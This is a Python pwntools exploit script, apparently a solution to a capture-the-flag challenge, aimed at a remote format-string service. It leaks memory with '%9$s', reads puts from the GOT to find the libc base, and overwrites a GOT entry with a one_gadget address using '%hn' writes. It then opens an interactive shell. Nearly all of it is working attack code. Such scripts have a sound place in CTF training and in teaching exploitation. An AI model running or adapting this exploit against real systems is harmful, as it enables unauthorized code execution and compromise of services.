from pwn import *
import binascii

io=remote('node3.buuoj.cn',26113)
libc=ELF('./libc-2.23.so')

def leak(addr):
    payload = "%9$s.TMP" + p64(addr)
    io.sendline(payload)
    print "leaking:", hex(addr)
    io.recvuntil('Repeater:')
    resp = io.recvuntil(".TMP")
    ret = resp[:-4:]
    print ret, len(ret)
    remain = io.recvrepeat(0.2)
    return ret

#leak(0x400000)

print('puts:'+hex(libc.sym['puts']))
print('strlen:'+hex(libc.sym['strlen']))
print('printf:'+hex(libc.sym['printf']))
print('read:'+hex(libc.sym['read']))
print('memset:'+hex(libc.sym['memset']))
print('setbuf:'+hex(libc.sym['setbuf']))
print('alarm:'+hex(libc.sym['alarm']))


#start_addr = 0x601000
#leak(0x06010a0)


'''
text_seg = ''
try:
    while True:
        ret = leak(start_addr)
        text_seg += ret
        start_addr += len(ret)
        if start_addr>=0x6010a0:
            break
        if len(ret) == 0:
            start_addr += 1
            text_seg += '\x00'
except Exception as e:
    print e

print '[+]', len(text_seg)
with open('dump_got', 'wb') as fout:
    fout.write(text_seg)

'''
#puts_plt=0x8048470
#puts_got=0x804a014
puts_got=0x601048
#sprint_got=0x804a030


payload = "%9$s.TMP" + p64(puts_got)
io.sendline(payload)
io.recvuntil('Repeater:')
puts_add=u64(io.recv(6).ljust(8,'\x00'))
print(hex(puts_add))


libc_base=puts_add-0x0f7250
print(hex(libc_base))
one_gadget=libc_base+0xf1147
print(hex(one_gadget))

a=one_gadget%0x10000&0xffff
print(hex(a))
b=(one_gadget/0x10000)%0x10000&0xffff
print(hex(b))
pause()

payload = '%' + str(a-9) + 'c' +'%12$hn'
payload += '%' + str(b - a) + 'c' +'%13$hn'
payload = payload.ljust(32, 'A')+p64(0x601058)+p64(0x601058+2)
io.sendline(payload)
'''
io.recvuntil('QQQ')
edit=u64(io.recv(6).ljust(8,'\x00'))
print(hex(edit))
#io.sendline('/bin/sh\x00')
'''

#io.sendline('AAAAAAAA'+'%8$p')


io.interactive()
